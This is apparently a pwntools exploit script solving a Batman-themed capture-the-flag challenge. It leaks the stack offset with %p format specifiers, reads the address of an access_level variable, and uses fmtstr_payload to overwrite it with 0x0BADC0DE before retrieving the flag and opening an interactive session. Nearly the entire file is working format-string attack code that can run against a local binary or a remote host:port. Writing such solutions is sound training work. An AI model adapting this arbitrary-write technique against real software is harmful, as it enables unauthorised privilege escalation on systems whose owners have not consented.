#!/usr/bin/env python3
"""
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘           BATCOMPUTER EXPLOIT - Gotham Cyber Division CTF                â•‘
â•‘                                                                           â•‘
â•‘   Vulnerability: Format String Attack                                     â•‘
â•‘   Target: Overwrite access_level to match required_level (0x0BADC0DE)    â•‘
â•‘   Flag Format: GTH{...}                                                   â•‘
â•‘                                                                           â•‘
â•‘   "The night is darkest just before the dawn."                           â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

Usage:
    Local:  python3 exploit.py LOCAL
    Remote: python3 exploit.py REMOTE <host> <port>

Example:
    python3 exploit.py LOCAL
    python3 exploit.py REMOTE challenge.gotham-ctf.com 9001
"""

from pwn import *
import sys

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# CONFIGURATION
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

# Binary name (for local testing)
BINARY = './batcomputer'

# Target value to write (Batman's access code)
TARGET_VALUE = 0x0BADC0DE

# Format string offset (our input appears at position 6 on the stack)
FMT_OFFSET = 6

# Hardcoded address for access_level (from nm/objdump)
# This is reliable because No PIE
ACCESS_LEVEL_ADDR = 0x404100

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# SETUP
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

def setup_context():
    """Configure pwntools context for x86_64 exploitation."""
    context.arch = 'amd64'
    context.os = 'linux'
    context.endian = 'little'
    context.log_level = 'info'

def get_process():
    """Get process handle for local or remote exploitation."""
    if len(sys.argv) >= 2 and sys.argv[1] == 'REMOTE':
        if len(sys.argv) < 4:
            log.error("Usage: python3 exploit.py REMOTE <host> <port>")
            sys.exit(1)
        host = sys.argv[2]
        port = int(sys.argv[3])
        log.info(f"Connecting to remote: {host}:{port}")
        return remote(host, port)
    else:
        log.info(f"Starting local process: {BINARY}")
        return process(BINARY)

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# EXPLOIT FUNCTIONS
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

def find_format_offset(p):
    """
    Find the offset where our input appears on the stack.
    Useful for dynamic offset discovery.
    """
    log.info("Finding format string offset...")
    
    # Send a marker pattern with format specifiers
    marker = b"AAAABBBB"
    leak_payload = marker + b".%p" * 20
    
    p.sendlineafter(b'command: ', b'1')
    p.sendlineafter(b'description: ', leak_payload)
    
    p.recvuntil(b'[LOGGED] ')
    response = p.recvuntil(b'\n').decode()
    
    # Look for 0x4242424241414141 (AAAABBBB in little-endian)
    parts = response.split('.')
    for i, part in enumerate(parts):
        if '4141414142424242' in part.upper() or '4242424241414141' in part.upper():
            log.success(f"Found input at offset {i}")
            return i
    
    log.warning("Could not find offset automatically, using default: 6")
    return 6

def get_access_level_address(p):
    """
    Get the address of access_level from the program output.
    The program tells us this when we check access level (option 2).
    """
    log.info("Getting access_level address from program...")
    
    p.sendlineafter(b'command: ', b'2')
    
    p.recvuntil(b'access_level address: ')
    addr_str = p.recvuntil(b'\n').decode().strip()
    addr = int(addr_str, 16)
    
    log.success(f"access_level @ {hex(addr)}")
    return addr

def exploit(p, target_addr):
    """
    Main exploitation function.
    Uses pwntools fmtstr_payload to write 0x0BADC0DE to access_level.
    """
    log.info(f"Crafting format string payload...")
    log.info(f"Target: write {hex(TARGET_VALUE)} to {hex(target_addr)}")
    
    # pwntools handles the complexity of multi-byte writes
    payload = fmtstr_payload(FMT_OFFSET, {target_addr: TARGET_VALUE})
    
    log.info(f"Payload length: {len(payload)} bytes")
    
    # Send the exploit
    p.sendlineafter(b'command: ', b'1')
    p.sendlineafter(b'description: ', payload)
    
    # Wait for logging to complete
    p.recvuntil(b'[SUCCESS]')
    log.success("Exploit payload sent!")

def verify_and_get_flag(p):
    """
    Verify exploitation worked and retrieve the flag.
    """
    log.info("Verifying exploitation...")
    
    # Check access level
    p.sendlineafter(b'command: ', b'2')
    response = p.recvuntil(b'command: ').decode()
    
    if 'AUTHORIZED' in response or 'Welcome, Dark Knight' in response:
        log.success("Access level verified! Exploitation successful!")
    else:
        log.failure("Exploitation may have failed, attempting flag retrieval anyway...")
    
    # Try to get flag
    log.info("Accessing classified intel...")
    p.sendline(b'3')
    
    response = p.recvuntil(b'Dark Knight', timeout=5).decode()
    
    # Extract flag
    import re
    flag_match = re.search(r'GTH\{[^}]+\}', response)
    
    if flag_match:
        return flag_match.group(0)
    else:
        log.warning("Could not extract flag automatically")
        return None

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# MAIN
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

def main():
    print("""
    â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
    â•‘        BATCOMPUTER EXPLOIT - The Dark Knight Rises           â•‘
    â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    """)
    
    setup_context()
    p = get_process()
    
    # Wait for banner
    p.recvuntil(b'authentication...')
    
    try:
        # Step 1: Get target address from program
        target_addr = get_access_level_address(p)
        
        # Step 2: Exploit format string vulnerability
        exploit(p, target_addr)
        
        # Step 3: Get the flag
        flag = verify_and_get_flag(p)
        
        if flag:
            print("\n" + "="*60)
            print(f"  ğŸ¦‡ FLAG: {flag}")
            print("="*60 + "\n")
        
        # Interactive mode
        p.interactive()
        
    except Exception as e:
        log.error(f"Exploit failed: {e}")
        p.close()
        return 1
    
    return 0

if __name__ == '__main__':
    exit(main())
